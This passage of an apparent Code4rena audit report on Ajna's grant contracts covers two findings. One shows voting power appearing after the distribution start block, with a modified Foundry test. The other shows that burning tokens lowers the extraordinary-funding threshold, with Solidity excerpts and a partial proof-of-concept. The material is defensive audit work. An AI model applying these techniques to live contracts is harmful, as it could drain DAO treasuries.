class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // start distribution period</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _startDistributionPeriod(_grantFund);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // check voting power of _tokenHolder1 is 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 votingPower = _getScreeningVotes(_grantFund, _tokenHolder1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(votingPower, 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        votingPower = _getScreeningVotes(_grantFund, nonVotingAddress);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(votingPower, 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/288#issuecomment-1572921612\">rbserver (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Thanks for your reply and unit test!</p>\n<p>The thing is that, to vote in the current distribution period, Alice does not have to vote at the current distribution period’s start block and can vote at an eligible block after the current distribution period’s start block as stated in Step 3 of the POC section. When voting at such eligible block, Alice can utilize the available votes that she gained at the start block. To demonstrate this, I’ve made some modifications to your unit test below, which does pass. Please see <code>@audit</code> for the places of modification. For this test, at <code>_startBlock + 33</code>, which is the start block, <code>_tokenHolder1</code>’s voting power is 0; however, at <code>_startBlock + 34</code> and <code>_startBlock + 35</code>, <code>_tokenHolder1</code>’s voting power becomes 25<em>000</em>000 * 1e18. The inconsistency between the voting power when voting at the start block and when voting at an eligible block after the start block is the main point of this report.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testVotingPowerAtDistributionStart</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 14 tokenholders self delegate their tokens to enable voting on the proposals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_selfDelegateVoters</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_votersArr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// roll 32 blocks forward to the block before the distribution period starts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_startBlock</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">32</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// _tokenHolder1 transfers their tokens away</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nonVotingAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;nonVotingAddress&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenHolder1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// @audit transfer _token.balanceOf(_tokenHolder1) so _tokenHolder1 does not have any AJNA at _startBlock + 32</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nonVotingAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenHolder1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_startBlock</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">33</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// nonVotingAddress returns the funds one block later</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nonVotingAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenHolder1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">25_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// start distribution period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_startDistributionPeriod</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check voting power of _tokenHolder1 is 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getScreeningVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getScreeningVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nonVotingAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// @audit at _startBlock + 34, _tokenHolder1&#39;s voting power becomes 25_000_000 * 1e18, which is not 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_startBlock</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">34</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getScreeningVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">, </span><span class=\"mtk7\">25_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// @audit at _startBlock + 35, _tokenHolder1&#39;s voting power is still 25_000_000 * 1e18, which is not 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_startBlock</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">35</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getScreeningVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">, </span><span class=\"mtk7\">25_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/288#issuecomment-1572931527\">MikeHathaway (Ajna) commented</a>:</strong></p>\n<blockquote>\n<p>My mistake, you are correct. This is a real issue. Thank you for the report and the extra assertions!</p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-the-voting-thresholds-in-ajnas-extraordinary-funding-mechanism-can-be-manipulated-to-execute-proposals-below-the-expected-threshold\" style=\"position:relative;\"><a href=\"#m-08-the-voting-thresholds-in-ajnas-extraordinary-funding-mechanism-can-be-manipulated-to-execute-proposals-below-the-expected-threshold\" aria-label=\"m 08 the voting thresholds in ajnas extraordinary funding mechanism can be manipulated to execute proposals below the expected threshold permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/285\">[M-08] The voting thresholds in Ajna’s Extraordinary Funding Mechanism can be manipulated to execute proposals below the expected threshold</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/285\">bytes032</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/287\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/213\">ktg</a>, and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/185\">7siech</a></em></p>\n<p>This vulnerability presents a significant risk to the Ajna treasury. A malicious actor who owns a substantial amount of tokens could manipulate the voting mechanism by burning their own tokens, thereby lowering the minimum threshold of votes required for a proposal to pass.</p>\n<p>This tactic could allow him to siphon off substantial amounts from the treasury.</p>\n<h3 id=\"proof-of-concept-17\" style=\"position:relative;\"><a href=\"#proof-of-concept-17\" aria-label=\"proof of concept 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>By meeting a certain quorum of non-treasury tokens, token holders may take tokens from the treasury outside of the PFM by utilizing Extraordinary Funding Mechanism (EFM).</p>\n<p>This mechanism works by allowing up to the percentage over 50% of non-treasury tokens (the “minimum threshold”) that vote affirmatively to be removed from the treasury – the cap on this mechanism is therefore 100% minus the minimum threshold (50% in this case).</p>\n<p>Examples:</p>\n<ol>\n<li>If 51% of non-treasury tokens vote affirmatively for a proposal, up to 1% of the treasury may be withdrawn by the proposal</li>\n<li>If 65% of non-treasury tokens vote affirmatively for a proposal, up to 15% of the treasury may be withdrawn by the proposal</li>\n<li>If 50% or less of non-treasury tokens vote affirmatively for a proposal, 0% of the treasury may be withdrawn by the proposal</li>\n</ol>\n<p>When submitting a proposal, the proposer must include the exact percentage of the treasury they would like to extract (“proposal threshold”), if the vote fails to reach this threshold, it will fail, and no tokens will be distributed.</p>\n<p>Example:\na. A proposer requests 10% of the treasury</p>\n<ol>\n<li>50%+10%=60%</li>\n<li>If 65% of non-treasury tokens vote affirmatively, 10% of the treasury is released</li>\n<li>If 59.9% of non-treasury tokens vote affirmatively, 0% of the treasury is released</li>\n</ol>\n<p>The function that checks the conditions above are true, and the proposal has succeeded is <code>_extraordinaryProposalSucceeded</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L164-L178\">https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L164-L178</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_extraordinaryProposalSucceeded</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokensRequested_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votesReceived</span><span class=\"mtk1\">          = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_extraordinaryFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">votesReceived</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// @audit-info check _getMinimumThresholdPercentage() function</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minThresholdPercentage</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getMinimumThresholdPercentage</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// succeeded if proposal&#39;s votes received doesn&#39;t exceed the minimum threshold required</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// @audit-info check _getSliceOfNonTreasury() function</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">votesReceived</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">tokensRequested_</span><span class=\"mtk1\"> + </span><span class=\"mtk11\">_getSliceOfNonTreasury</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minThresholdPercentage</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// succeeded if tokens requested are available for claiming from the treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">tokensRequested_</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk11\">_getSliceOfTreasury</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk12\">WAD</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">minThresholdPercentage</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The vulnerability here lies in the <code>_getSliceOfNonTreasury()</code> function.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L222-L227\">https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L222-L227</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getSliceOfNonTreasury</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">percentage_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalAjnaSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ajnaTokenAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// return ((ajnaTotalSupply - treasury) * percentage + 10**18 / 2) / 10**18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wmul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalAjnaSupply</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">, </span><span class=\"mtk12\">percentage_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The reason is that it relies on the <strong>current</strong> total supply and <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/token/AjnaToken.sol#L11\">AjnaToken inherits ERC20Burnable</a>, a malicious user can burn his tokens to lower the minimum threshold needed for votes and make the proposal pass.</p>\n<p>Bob, a token holder, owns 10% of the Ajna supply. He creates a proposal where he requests 20% of the treasury. For his proposal to pass, Bob needs to gather 70% of the votes (50% as the threshold because there are no other funded proposals yet and an additional 20% for the tokens he requested). Unfortunately, Bob only manages to acquire 61% of the total votes.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L206-L215\">https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L206-L215</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getMinimumThresholdPercentage</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// default minimum threshold is 50</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_fundedExtraordinaryProposals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.5</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// minimum threshold increases according to the number of funded EFM proposals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// @audit-info 10 proposals max</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.5</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> + (</span><span class=\"mtk12\">_fundedExtraordinaryProposals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> * (</span><span class=\"mtk7\">0.05</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\">            </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// 70%              20%                </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">votesReceived</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">tokensRequested_</span><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t\t\t\t</span><span class=\"mtk7\">50</span><span class=\"mtk1\">%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t+ </span><span class=\"mtk11\">_getSliceOfNonTreasury</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minThresholdPercentage</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// succeeded if tokens requested are available for claiming from the treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">tokensRequested_</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk11\">_getSliceOfTreasury</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk12\">WAD</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">minThresholdPercentage</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ;</span></span></span></code></pre>\n<p>Bob then burns 10% of his own tokens. This action reduces the total supply and, consequently, the threshold too. Now, the proposal needs only 61% to pass, and since Bob already has this percentage, he can execute his proposal and siphon off funds from the treasury.</p>\n<p>Here’s a PoC that can be used to showcase the issue:</p>\n<p>For the ease of use, please add a console.log to the <code>_extraordinaryProposalSucceeded</code> function</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">function _extraordinaryProposalSucceeded(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 proposalId_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 tokensRequested_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) internal view returns (bool) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 